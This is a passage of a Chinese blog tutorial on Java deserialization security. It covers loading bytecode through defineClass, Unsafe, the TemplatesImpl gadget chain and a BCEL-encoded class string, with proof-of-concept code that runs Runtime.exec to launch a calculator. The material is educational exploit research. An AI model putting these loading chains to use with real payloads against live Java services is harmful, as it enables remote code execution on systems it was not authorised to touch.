+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>成功弹出计算器，如果报错的话，看一看 invoke 方法调用时的 “Calc” 位置是否正确。</li>
+</ul>
+<p>使用<code>ClassLoader#defineClass</code>直接加载字节码有个优点就是不需要出网也可以加载字节码，但是它也是有缺点的，就是需要设置<code>m.setAccessible(true);</code>，这在平常的反射中是无法调用的。</p>
+<p>在实际场景中，因为 <code>defineClass</code> 方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链 <code>TemplatesImpl</code> 的基石。</p>
+<h3 id="5-Unsafe-加载字节码"><a href="#5-Unsafe-加载字节码" class="headerlink" title="5. Unsafe 加载字节码"></a>5. Unsafe 加载字节码</h3><ul>
+<li>Unsafe中也存在<code>defineClass()</code>方法，本质上也是 <code>defineClass</code> 加载字节码的方式。</li>
+</ul>
+<p>跟进去看一看 <code>Unsafe</code> 的 <code>defineClass()</code> 方法</p>
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/UnsafeClassLoader.png" class="">
+
+<p>这里的 <code>Unsafe</code> 方法，是采用单例模式进行设计的，所以虽然是  public 方法，但无法直接调用，因为我们用反射来调用它。</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader<span class="token punctuation">.</span>UnsafeClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span><span class="token class-name">Unsafe</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">ProtectionDomain</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UnsafeClassLoaderRce</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>  
+        <span class="token class-name">ClassLoader</span> classLoader <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Unsafe</span><span class="token punctuation">></span></span> unsafeClass <span class="token operator">=</span> <span class="token class-name">Unsafe</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>  
+ <span class="token class-name">Field</span> unsafeField <span class="token operator">=</span> unsafeClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"theUnsafe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ unsafeField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token class-name">Unsafe</span> classUnsafe <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Unsafe</span><span class="token punctuation">)</span> unsafeField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token class-name">Method</span> defineClassMethod <span class="token operator">=</span> unsafeClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"defineClass"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>  
+ <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">ProtectionDomain</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"E:\\Calc.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token class-name">Class</span> calc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> defineClassMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>classUnsafe<span class="token punctuation">,</span> <span class="token string">"src.Calc"</span><span class="token punctuation">,</span> code<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> code<span class="token punctuation">.</span>length<span class="token punctuation">,</span> classLoader<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ calc<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="6-TemplatesImpl-加载字节码"><a href="#6-TemplatesImpl-加载字节码" class="headerlink" title="6. TemplatesImpl 加载字节码"></a>6. TemplatesImpl 加载字节码</h3><ul>
+<li>我们先跟进 TemplatesImpl 这个包中看 TemplatesImpl 的结构图</li>
+</ul>
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/TemplateImplBag.png" class="">
+
+<p>可以看到在 <code>TemplatesImpl</code> 类中还有一个内部类 <code>TransletClassLoader</code>，这个类是继承 <code>ClassLoader</code>，并且重写了 <code>defineClass</code> 方法。</p>
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/TemplateImplCode.png" class="">
+
+<ul>
+<li>简单来说，这里的 <code>defineClass</code> 由其父类的 protected 类型变成了一个 default 类型的方法，可以被类外部调用。</li>
+</ul>
+<p>我们从 <code>TransletClassLoader#defineClass()</code> 向前追溯一下调用链：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">TemplatesImpl</span>#<span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name">TemplatesImpl</span>#<span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span>
+
+<span class="token class-name">TemplatesImpl</span>#<span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name">TemplatesImpl</span>#<span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token operator">-></span> <span class="token class-name">TransletClassLoader</span>#<span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>追到最前面两个方法 <code>TemplatesImpl#getOutputProperties()</code> 和 <code>TemplatesImpl#newTransformer()</code> ，这两者的作用域是public，可以被外部调用。</p>
+<p>我们尝试用 <code>TemplatesImpl#newTransformer()</code> 构造一个简单的 POC</p>
+<p>首先先构造字节码，注意，这里的字节码必须继承<code>AbstractTranslet</code>，因为继承了这一抽象类，所以必须要重写一下里面的方法。</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader<span class="token punctuation">.</span>TemplatesImplClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span>DOM<span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>  
+  
+<span class="token comment">// TemplatesImpl 的字节码构造  </span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TemplatesBytes</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> dom<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> dom<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  
+    <span class="token keyword">public</span> <span class="token class-name">TemplatesBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>  
+        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"Calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>字节码这里的编写比较容易，我就一笔带过了，接下来我们重点关注 POC 是如何编写出来的。</p>
+<p>因为是一整条链子，参考最开始我们讲的 URLDNS 链，我们需要设置其一些属性值，从而让我们的链子传递下去。我这里先把 POC 挂出来，结合着讲。</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader<span class="token punctuation">.</span>TemplatesImplClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span><span class="token punctuation">;</span>  
+  
+<span class="token comment">// 主程序  </span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TemplatesRce</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>  
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"E:\\JavaClass\\TemplatesBytes.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"Calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>code<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ templates<span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>  
+        <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们定义了一个设置私有属性的方法，命名为 <code>setFieldValue</code>，根据我们的链子，一个个看。</p>
+<blockquote>
+<p>TemplatesImpl#getOutputProperties() -&gt;<br>TemplatesImpl#newTransformer() -&gt;<br>TemplatesImpl#getTransletInstance() -&gt;<br>TemplatesImpl#defineTransletClasses() -&gt;<br>TransletClassLoader#defineClass()</p>
+</blockquote>
+<ul>
+<li>主要是三个私有类的属性<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"Calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/TransletInstance.png" class=""></li>
+</ul>
+<p>显然，<code>_name</code> 不能为 null，我们才能进入链子的下一部分。<br>链子的下一部分为 <code>defineTransletClasses</code>，我们跟进去。</p>
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/defineTransletClasses.png" class="">
+
+<p><code>_tfactory</code> 需要是一个 <code>TransformerFactoryImpl</code> 对象，因为 <code>TemplatesImpl#defineTransletClasses()</code> 方法里有调用到 <code>_tfactory.getExternalExtensionsMap()</code> ，如果是 null 会出错。</p>
+<p>弹计算器成功</p>
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/TemplatesImplSuccess.png" class="">
+
+<h3 id="7-利用-BCEL-ClassLoader-加载字节码"><a href="#7-利用-BCEL-ClassLoader-加载字节码" class="headerlink" title="7. 利用 BCEL ClassLoader 加载字节码"></a>7. 利用 BCEL ClassLoader 加载字节码</h3><ul>
+<li>什么是 BCEL？</li>
+</ul>
+<p>BCEL 的全名应该是 Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为被 Apache Xalan 所使用，而 Apache Xalan 又是 Java 内部对于 JAXP 的实现，所以 BCEL 也被包含在了 JDK 的原生库中。</p>
+<p>我们可以通过 BCEL 提供的两个类 <code>Repository</code> 和 <code>Utility</code> 来利用： <code>Repository</code> 用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用javac命令来编译 java 文件生成字节码； <code>Utility</code> 用于将原生的字节码转换成BCEL格式的字节码：</p>
+<p>我们还是用之前写过的 <code>Calc.java</code> 这个类。</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader<span class="token punctuation">.</span>URLClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>  
+   
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Calc</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>  
+        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>  
+            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+    <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这样子的代码是可以成功弹计算器了，但是我们发现有一堆乱码，处理一下。</p>
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/BCELRce.png" class="">
+
+<p>这一堆特殊的代码，BCEL ClassLoader 正是用于加载这串特殊的“字节码”，并可以执行其中的代码。我们修改一下 POC</p>
+<ul>
+<li>注意这里的 ClassLoader 包不要导错了。</li>
+</ul>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader<span class="token punctuation">.</span>BCELClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token comment">// 修改过滤乱码  </span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BCELSuccessRce</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>  
+        <span class="token keyword">new</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"$$BCEL$$"</span> <span class="token operator">+</span> <span class="token string">"$l$8b$I$A$A$A$A$A$A$A$8dQMO$db$40$Q$7d$9b8$b1c$i$C$81$f0$d1$PhK$81$QU$f5$a57$Q$97$ARU$D$V$Bz$de$y$ab$b0$d4$b1$p$7b$83$e0$X$f5$cc$85$o$O$fd$B$fc$u$c4$ecBi$a4$f6PK$9e$f1$7b3$f3$e6$ad$f7$ee$fe$f6$X$80OX$f1$e1a$d6$c7$i$e6$3d$bc0$f9$a5$8bW$3eJx$edb$c1$c5$oCyC$rJo2$U$9bk$c7$MN$3b$3d$91$M$b5H$rro$d8$ef$ca$ec$90wcb$eaQ$wx$7c$cc3e$f0$T$e9$e8S$953$7c$88$f2L$84$5b$97$J$ef$x$d1$8ey$9eG$v$3f$91Yxt$Q$8d$c26$8f$c5$3a$83$b7$n$e2$a7$a5$8cD$g$d1$Z$3f$e7$a1J$c3$cf$fb$db$XB$O$b4J$Tj$abv4$X$dfw$f9$c0$$$p$df$M$7e$t$jfB$ee$u$b3$bcb$e4$3e$9a$d9$A$V$f8$$$de$Ex$8bw$e4$8a$8c$8a$AKx$cf0$f5$P$ed$A$cb$f0$ZZ$ffo$9aa$c2$ea$c4$3c$e9$85$fb$dd3$v4$c3$e4$l$ea$60$98h$d5$tO$7eO$eag$d0h$aeE$7f$f5$d0$c1$iy$nIr$b59R$ed$e8L$r$bd$f5$d1$81$afY$wd$9e$d3$40m$40Em$7f$c7a$c6$85$a4c$bat$b1$e6$v$80$99$c3S$i$p$URf$94K$ad$9f$60W$b6$iP$y$5b$b2$8c$w$c5$e0$b1$B$e3$a8Q$f60$f1$3c$cc$ad$YP$bfA$a1$5e$bc$86$f3$ed$H$bc$_$adk$94$af$y_$a1$d9$S$8aVq$86$be$Mc$b8$80$U$aa$a40I$f1$f7$86$w$i$c2uBS$f4$ba$uD$$$a6$j$w4$ac$a9$99$H$X$f0$df$84$a2$C$A$A"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>那么为什么要在前面加上 <code>$$BCEL$$</code> 呢？这里引用一下p神的解释</p>
+<blockquote>
+<p>BCEL 这个包中有个有趣的类<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，他是一个 ClassLoader，但是他重写了 Java 内置的<code>ClassLoader#loadClass()</code>方法。</p>
+<p>在 <code>ClassLoader#loadClass()</code> 中，其会判断类名是否是 <code>$$BCEL$$</code> 开头，如果是的话，将会对这个字符串进行 decode</p>
+</blockquote>
+<h2 id="0x05-关于字节码的小结"><a href="#0x05-关于字节码的小结" class="headerlink" title="0x05 关于字节码的小结"></a>0x05 关于字节码的小结</h2><ul>
+<li>首先我们要知道字节码与安全有什么关系，不是照着敲几行代码，看到弹出计算器就是可以的了，我们需要去分析原因，不然和安全研究没有半毛钱关系。</li>
+</ul>
+<p>我们要最终达到的目的其实是加载 class 文件，也就是字节码文件。所以我们所做的一系列工作都是为了能够调用这些 class，只有完成了这一步，才能继续我们的链子。</p>
+
+            </div>
+
+            
